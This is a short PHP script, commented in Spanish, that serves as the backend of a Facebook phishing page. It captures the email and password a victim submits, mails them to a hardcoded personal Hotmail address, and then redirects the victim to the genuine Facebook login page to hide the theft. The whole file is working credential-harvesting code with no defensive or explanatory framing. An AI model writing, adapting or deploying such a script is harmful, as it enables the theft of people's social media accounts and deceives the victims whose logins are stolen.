<?php
// Recibir datos del formulario
$email = $_POST['email'];
$password = $_POST['password'];

// Dirección de correo a la que se enviará el mensaje
$destinatario = 'daiana_xd1@hotmail.com';

// Asunto del correo
$asunto = 'Datos de inicio de sesión en Facebook';

// Contenido del mensaje
$mensaje = "Correo electrónico: $email\n";
$mensaje .= "Contraseña: $password\n";

// Cabeceras del correo
$headers = "From: $email\r\n";

// Enviar correo
if (mail($destinatario, $asunto, $mensaje, $headers)) {
    // Redireccionar al usuario al login de Facebook
    header('Location: https://www.facebook.com/login.php');
    exit;
} else {
    echo 'Error al enviar el correo';
}
?>
